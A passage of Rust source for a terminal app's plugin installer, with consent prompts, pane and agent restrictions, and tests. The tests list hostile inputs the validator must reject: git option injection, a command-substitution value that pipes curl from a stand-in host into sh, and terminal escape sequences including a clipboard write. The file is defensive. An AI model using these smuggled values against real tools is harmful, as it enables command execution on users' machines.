    crate::log::info(&format!("plugin {name} turned {}", if on { "on" } else { "off" }));
    Ok(())
}

/// The catalog's word on this exact release in a sentence: unreviewed when it is not the catalog's, and any warning
/// the catalog gives about it.
pub fn catalog_words(c: &crate::catalog::Catalog, pin: &Pin) -> String {
    let mut out = match c.mark(Some(pin)) {
        "reviewed" => "Reviewed by the catalog's maintainer.".to_string(),
        "checked" => "Checked by the catalog.".into(),
        _ => "Not in the catalog: nobody reviewed this release.".into(),
    };
    if let Some(r) = c.revoked(&pin.name, &pin.commit).filter(|r| r.level == "soft") {
        out += &format!(" The catalog warns about it: {}.", crate::render::unspoofed(&r.why));
    }
    out
}

/// The question a person answers before anything is placed.
pub fn question(s: &Staged, log: &[String], new: Option<&[Ability]>) -> String {
    let p = &s.pin;
    let release = p.tag.as_ref().map(|t| format!("release {}, ", crate::render::unspoofed(t))).unwrap_or_default();
    let mut out = format!("From {}\n{release}commit {}\n{}\n\n{}", crate::render::unspoofed(&p.source), p.commit, catalog_words(&crate::catalog::read().0, p), report(&s.check));
    if !log.is_empty() {
        out += "\nNew commits:\n";
        for l in log {
            out += &format!("  {l}\n");
        }
    }
    if let Some(new) = new {
        if new.is_empty() {
            out += "\nIt can do nothing it could not before.\n";
        } else {
            out += "\nIt can now also:\n";
            for a in new {
                out += &format!("  {a}\n");
            }
        }
    }
    out
}

/// `nerd --plugin-add`, `--plugin-update`, `--plugin-remove`, `--plugin-off`, `--plugin-on`.
pub fn main(flag: &str, args: &[String]) -> std::io::Result<()> {
    let yes = args.iter().any(|a| a == "--yes");
    // Internal: the Plugins window's hidden fetch. It only stages, and every word it says goes to the fetch log.
    let window = args.iter().any(|a| a == "--window");
    if window {
        to_fetch_log()?;
    }
    let words: Vec<&String> = args.iter().filter(|a| *a != "--yes" && *a != "--window").collect();
    let in_pane = window || in_pane();
    refuse_yes(yes, in_pane).map_err(std::io::Error::other)?;
    // Turning a plugin back on gives back what the owner took away; from a pane that is the Plugins window's to do.
    if in_pane && matches!(flag, "--plugin-on" | "--plugin-remove") {
        return Err(std::io::Error::other(format!("refused: {flag} from inside a pane; use nerd's Plugins window")));
    }
    let r = match (flag, words.as_slice()) {
        ("--plugin-add", [lock, file]) if *lock == "--lock" => restore(Path::new(file.as_str()), yes, in_pane),
        ("--plugin-add", [url]) => add(url, yes, in_pane),
        ("--plugin-update", []) => read_lock().and_then(|pins| pins.iter().try_for_each(|p| update(&p.name, yes, in_pane))),
        ("--plugin-update", [name]) => update(name, yes, in_pane),
        ("--plugin-remove", [name]) => remove_asking(name, None),
        ("--plugin-remove", [name, d]) if *d == "--data" || *d == "--keep-data" => remove_asking(name, Some(*d == "--data")),
        ("--plugin-off", [name]) => turn(name, false, "turned off"),
        ("--plugin-catalog", []) => crate::catalog::refresh().map(|lines| lines.iter().for_each(|l| println!("{l}"))),
        ("--plugin-on", [name]) => turn(name, true, ""),
        _ => Err(String::from(
            "usage: nerd --plugin-add <https://github.com/owner/repo | folder>[@tag|@commit] [--yes] | --plugin-add --lock <file> [--yes] | --plugin-update [<name>] [--yes] | \
             --plugin-remove <name> [--data|--keep-data] | --plugin-off <name> | --plugin-on <name> | --plugin-catalog"
        )),
    };
    r.map_err(std::io::Error::other)
}

/// What the Plugins window's last fetch said, git's full errors included; its last line is `nerd: <why>` on a failure.
pub fn fetch_log() -> PathBuf {
    root().join(STAGING).join("fetch.log")
}

static WINDOW: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);

fn to_fetch_log() -> std::io::Result<()> {
    use std::os::fd::AsRawFd as _;
    std::fs::create_dir_all(root().join(STAGING))?;
    let f = std::fs::File::create(fetch_log())?;
    for fd in [1, 2] {
        nix::unistd::dup2(f.as_raw_fd(), fd)?;
    }
    WINDOW.store(true, std::sync::atomic::Ordering::Relaxed);
    Ok(())
}

fn refuse_yes(yes: bool, in_pane: bool) -> Result<(), String> {
    if yes && in_pane {
        crate::log::warn("refused --yes from inside a pane");
        return Err("refused: --yes from inside a pane; answer in nerd's Plugins window".into());
    }
    Ok(())
}

/// A pane's program may be an agent: from there nothing is placed, the Plugins window asks.
/// It keeps an honest agent from installing on its own; it is no wall against code of the same user, which can write
/// the plugins folder anyway. The pane's marker is inherited, so a process that left the pane's tree still carries it.
fn in_pane() -> bool {
    (std::env::var_os("NERD_PANE").is_some() || crate::detect::procs().is_some_and(|p| crate::detect::under_broker(&p, std::process::id() as i32))) && !crate::msock::pane_rights()
}

/// `url@ref` names a tag or commit when what follows the last `@` holds no `:` or `/` (`git@host:x` has one).
pub fn split_ref(arg: &str) -> (&str, Option<&str>) {
    match arg.rsplit_once('@') {
        Some((url, r)) if !r.is_empty() && !r.contains([':', '/']) => (url, Some(r)),
        _ => (arg, None),
    }
}

/// Asked on the terminal, or taken with `--yes`; from a pane, left staged for the Plugins window.
fn decide(s: Staged, op: &str, q: &str, yes: bool, in_pane: bool) -> Result<Option<Staged>, String> {
    print!("{q}");
    if in_pane {
        let id = s.dir.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
        let ready = serde_json::json!({ "op": op, "id": id, "source": s.pin.source, "tag": s.pin.tag });
        let mut s = s;
        s.keep = true;
        crate::paths::write_private(&s.dir.join("ready.json"), "tmp", ready.to_string().as_bytes()).map_err(|e| e.to_string())?;
        println!("\nAnswer in nerd's Plugins window.");
        return Ok(None);
    }
    if yes || ask_terminal(&format!("{} {}?", if op == "add" { "Install" } else { "Update" }, s.pin.name)) {
        return Ok(Some(s));
    }
    println!("Nothing changed.");
    Ok(None)
}

fn add(arg: &str, yes: bool, in_pane: bool) -> Result<(), String> {
    // Before a ref is split off: `https://token@host` would otherwise lose its host to the ref.
    if secret_in(arg) {
        return Err(SECRET.into());
    }
    let (url, at) = split_ref(arg);
    let s = stage_add(url, at, !in_pane)?;
    let q = question(&s, &[], None);
    if let Some(s) = decide(s, "add", &q, yes, in_pane)? {
        let name = s.pin.name.clone();
        place(s)?;
        println!("Installed {name}.");
    }
    Ok(())
}

fn update(name: &str, yes: bool, in_pane: bool) -> Result<(), String> {
    let Some((s, log, new)) = stage_update(name)? else {
        println!("{name} is up to date.");
        return Ok(());
    };
    let q = question(&s, &log, Some(&new));
    // --yes never grants what it could not do before.
    if let Some(s) = decide(s, "update", &q, yes && new.is_empty(), in_pane)? {
        apply_update(s)?;
        println!("Updated {name}.");
    }
    Ok(())
}

/// Every entry of a lock from another Mac at its exact commit, asked once for all of them.
fn restore(file: &Path, yes: bool, in_pane: bool) -> Result<(), String> {
    if in_pane {
        return Err("refused: restoring from a lock inside a pane; run it in a terminal".into());
    }
    let lock = std::fs::read_to_string(file).map_err(|e| format!("{}: {e}", file.display()))?;
    let pins: Vec<Pin> = serde_json::from_str(&lock).map_err(|e| format!("{} does not parse: {e}", file.display()))?;
    for (i, p) in pins.iter().enumerate() {
        if pins[..i].iter().any(|o| o.name == p.name) {
            return Err(format!("{} is in the lock twice", p.name));
        }
        named(&p.name)?;
        source(&p.source, false)?;
        not_installed(&p.name)?;
        if !is_sha(&p.commit) {
            return Err(format!("{}: commit {:?} is not 40 characters of a commit", p.name, crate::render::unspoofed(&p.commit)));
        }
    }
    let mut staged = Vec::new();
    for p in pins {
        let s = stage(&p.source, Net::Fetch, Some(&p.commit), None)?.ok_or("nothing to install")?;
        if s.pin.name != p.name {
            return Err(format!("{} at {} is named {}", p.source, p.commit, s.pin.name));
        }
        // The tag is kept only when it still names that commit there.
        let tag = p.tag.filter(|t| git(Net::No, Some(&s.tree()), &["rev-parse", "--verify", "--quiet", "--end-of-options", &format!("refs/tags/{t}^{{commit}}")]).map(text).ok().as_deref() == Some(p.commit.as_str()));
        let mut s = s;
        s.pin.tag = tag;
        println!("{}", question(&s, &[], None));
        staged.push(s);
    }
    if staged.is_empty() || !(yes || ask_terminal(&format!("Install these {}?", staged.len()))) {
        println!("Nothing changed.");
        return Ok(());
    }
    for s in staged {
        let name = s.pin.name.clone();
        place(s)?;
        println!("Installed {name}.");
    }
    Ok(())
}

fn remove_asking(name: &str, data: Option<bool>) -> Result<(), String> {
    let data = match data {
        Some(d) => d,
        None if crate::plugins::data_dir(name).exists() => ask_terminal(&format!("Also delete {name}'s data in {}?", crate::plugins::data_dir(name).display())),
        None => false,
    };
    remove(name, data)?;
    println!("Removed {name}.");
    Ok(())
}

fn ask_terminal(q: &str) -> bool {
    use std::io::{IsTerminal as _, Write as _};
    if !std::io::stdin().is_terminal() {
        println!("{q} No terminal to answer in: nothing changed (--yes answers yes).");
        return false;
    }
    print!("{q} [y/N] ");
    let _ = std::io::stdout().flush();
    answered_yes(std::io::stdin().lock()).unwrap_or(false)
}

/// Read as bytes: a byte that is not UTF-8 (a key or a report the terminal sent) is a no, not an error.
pub(crate) fn answered_yes(mut r: impl std::io::BufRead) -> std::io::Result<bool> {
    let mut line = Vec::new();
    r.read_until(b'\n', &mut line)?;
    Ok(matches!(String::from_utf8_lossy(&line).trim(), "y" | "Y" | "yes"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_lock_whose_commit_is_not_one_is_refused_whole() {
        crate::session::tests::with_temp_state_dir("lock-commit", || {
            let lock = crate::paths::state_root().join(LOCK);
            std::fs::create_dir_all(lock.parent().unwrap()).unwrap();
            std::fs::write(&lock, r#"[{"name":"p","source":"https://x/p.git","commit":"ééééééééééééééé"}]"#).unwrap();
            assert!(read_lock().unwrap_err().contains("is not a commit"));
            std::fs::write(&lock, format!(r#"[{{"name":"p","source":"https://x/p.git","commit":"{}"}}]"#, "a".repeat(40))).unwrap();
            assert_eq!(read_lock().unwrap().len(), 1);
        });
    }

    #[test]
    fn git_reaches_the_network_only_to_clone() {
        for args in [&["fetch", "origin"][..], &["push", "origin"], &["ls-remote", "https://github.com/a/b"], &[]] {
            let e = git(Net::Fetch, None, args).unwrap_err();
            assert!(e.contains("may not reach the network"), "{args:?}: {e}");
            assert!(git(Net::FetchLocal, None, args).unwrap_err().contains("may not reach the network"), "{args:?}");
        }
    }

    #[test]
    fn only_a_public_github_repository_reaches_git() {
        for ok in ["https://github.com/me/x.git", "https://github.com/me/x", "https://github.com/my-org/x.y_z"] {
            assert_eq!(source(ok, false).as_deref(), Ok(ok));
        }
        for bad in [
            "--upload-pack=touch x", "-x", "ext::sh -c x", "http://example.com/x", "file:///tmp/x", "/tmp", "git@:x", "a b", "https://x\n",
            "https://e.example/r.git;$(curl${IFS}e.example|sh)", "git@h:x'y", "https://e.example/`id`",
            "ssh://git@github.com/me/x", "git@github.com:me/x.git", "https://gitlab.com/me/x.git", "https://github.com.evil.example/me/x",
            "https://github.com:443/me/x", "http://github.com/me/x", "https://github.com/me", "https://github.com/me/x/y", "https://github.com/me/x?y",
            "https://github.com/me/x#y", "https://github.com/../x", "https://github.com/me/..", "https://github.com/-me/x", "https://github.com//x",
        ] {
            assert!(source(bad, false).is_err(), "{bad}");
        }
        assert!(source("/", true).is_ok(), "a folder typed in a terminal");
    }

    #[test]
    fn no_address_carries_a_secret_and_no_name_is_a_path_or_a_flag() {
        for bad in ["https://u:token@github.com/me/x.git", "https://token@github.com/me/x.git", "ssh://u:pw@host/x"] {
            assert!(source(bad, false).unwrap_err().contains("password or token"), "{bad}");
        }
        for bad in ["", "../x", "a/b", "--yes", "-x", "A"] {
            assert!(named(bad).is_err(), "{bad:?}");
        }
        assert!(named("my-plugin2").is_ok());
    }

    #[test]
    fn a_token_never_reaches_git_even_as_a_host() {
        assert!(secret_in("https://ghp_SECRET@github.com"));
        assert!(add("https://ghp_SECRET@github.com", true, false).unwrap_err().contains("password or token"));
        assert!(!secret_in("ssh://git@host/x") && !secret_in("https://github.com/me/x@v1.0.0"));
    }

    #[test]
    fn every_question_says_what_the_catalog_says_about_that_release() {
        let e = crate::catalog::Entry { name: "p".into(), title: "P".into(), summary: String::new(), url: "https://x/p.git".into(), tag: "v1.0.0".into(), commit: "a".repeat(40), version: "1.0.0".into(), risk: 0, review: "checked".into() };
        let r = crate::catalog::Revoked { name: "p".into(), commit: "a".repeat(40), level: "soft".into(), why: "slow".into() };
        let c = crate::catalog::Catalog { entries: vec![e], revoked: vec![r], ..Default::default() };
        let pin = |commit: String| Pin { name: "p".into(), source: "https://x/p.git".into(), tag: None, commit };
        assert_eq!(catalog_words(&c, &pin("a".repeat(40))), "Checked by the catalog. The catalog warns about it: slow.");
        assert_eq!(catalog_words(&c, &pin("b".repeat(40))), "Not in the catalog: nobody reviewed this release.");
    }

    #[test]
    fn yes_is_refused_from_a_pane_and_nowhere_else() {
        assert!(refuse_yes(true, true).unwrap_err().contains("from inside a pane"));
        assert!(refuse_yes(true, false).is_ok() && refuse_yes(false, true).is_ok());
    }

    #[test]
    fn a_stranger_s_manifest_text_reaches_the_terminal_without_escapes() {
        let c = Check { name: "x\u{1b}[2J".into(), title: "t\u{1b}]52;c;AAAA\u{7}".into(), version: Some("1\u{202e}".into()), problems: vec!["p\u{1b}[31m".into()], ..Check::default() };
        let r = report(&c);
        assert!(!r.contains('\u{1b}') && !r.contains('\u{7}') && !r.contains('\u{202e}'), "{r:?}");
    }

    #[test]
    fn a_link_stays_inside_only_when_it_never_climbs_out() {
        assert!(stays_inside("a/link", "b"));
        assert!(stays_inside("a/link", "../c"));
        assert!(!stays_inside("link", "../x"));
        assert!(!stays_inside("a/link", "../../x"));
        assert!(!stays_inside("a/link", "/usr/bin/x"));
        assert!(!stays_inside("link", "x/../../y"));
    }

    #[test]
    fn a_catalog_install_is_the_reviewed_commit_or_nothing() {
        let e = crate::catalog::Entry { name: "p".into(), title: "P".into(), summary: String::new(), url: "https://x/p.git".into(), tag: "v1.0.0".into(), commit: "a".repeat(40), version: "1.0.0".into(), risk: 0, review: "checked".into() };
        let staged = |commit: String| Staged { dir: std::env::temp_dir().join("nerd-never-made"), pin: Pin { name: "p".into(), source: e.url.clone(), tag: Some(e.tag.clone()), commit }, check: Check::default(), keep: true };
        assert!(reviewed(staged("a".repeat(40)), &e).is_ok());
        assert!(reviewed(staged("b".repeat(40)), &e).err().unwrap().contains("moved or removed the reviewed release v1.0.0"));
    }
}
